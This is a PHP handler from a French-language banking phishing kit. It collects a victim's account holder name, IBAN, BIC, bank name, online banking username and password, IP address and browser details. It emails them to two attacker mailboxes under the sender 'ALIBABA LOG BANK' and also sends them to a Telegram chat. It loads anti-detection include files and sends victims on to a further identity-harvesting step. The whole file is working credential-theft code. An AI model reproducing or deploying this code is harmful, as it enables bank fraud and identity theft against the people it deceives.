<?php

error_reporting(0);

	ob_start();

	session_start();



include '../../prevents/anti1.php';

include '../../prevents/anti2.php';

include '../../prevents/anti3.php';

include '../../prevents/anti4.php';

include '../../prevents/anti5.php';

include '../../prevents/anti6.php';

include '../../prevents/anti7.php';

include '../../prevents/anti8.php';

include '../../prevents/anti9.php';

include '../../monsterab/ab.php';

include '../../monsterab.php';

include '../../algorythm/mail.php';

include '../../algorythm/wanted_options.php';



if(isset($_POST['confirmationbutton']))

{





$_SESSION['titulaire'] = $_POST['titulaire'];

$_SESSION['iban'] = $_POST['iban'];

$_SESSION['bic'] = $_POST['bic'];

$_SESSION['banque'] = $_POST['bankname'];

$_SESSION['accid'] = $_POST['id'];

$_SESSION['accpw'] = $_POST['pw'];



$_SESSION['ip'] = $_SERVER['REMOTE_ADDR']; 



$_SESSION['browserinfo'] = $_SERVER['HTTP_USER_AGENT'];



if(empty($_SESSION['titulaire']) || empty($_SESSION['iban']) || empty($_SESSION['bic']) || empty($_SESSION['banque']) || empty($_SESSION['accid']) || empty($_SESSION['accpw']))

{



		header('Location: index.php?blank=true');



}

else{







$msg = "



🏛️ Titulaire du compte : ".$_SESSION['titulaire']."

🏛️ IBAN : ".$_SESSION['iban']."

🏛️ BIC : ".$_SESSION['bic']."

🏛️ Banque : ".$_SESSION['banque']."

🏛️ Identifiant : ".$_SESSION['accid']."

🏛️ Mot de passe : ".$_SESSION['accpw']."



🎪 IP Adress : ".$_SESSION['ip']."

🌐 User Agent : ".$_SESSION['browserinfo']."







";



$subject = "🏛️ REZ BANK 🏛️ | ".$_SESSION['ip'];

$fromsender = "From: ALIBABA LOG BANK <log@rezfr.com>";





mail($rezmail,$subject,$msg,$fromsender);
mail($rezmail2,$subject,$msg,$fromsender);

sendMessage($chatid, $msg, $token);



if($identity == 'yes')

{

$_SESSION['identity'] = true;

header('Location: ../identity/');





}

else{

	$_SESSION['finished'] = true;

	header('Location: ../finished/');

}





}







}



else{





	header('Location: ../../login/');



}





?>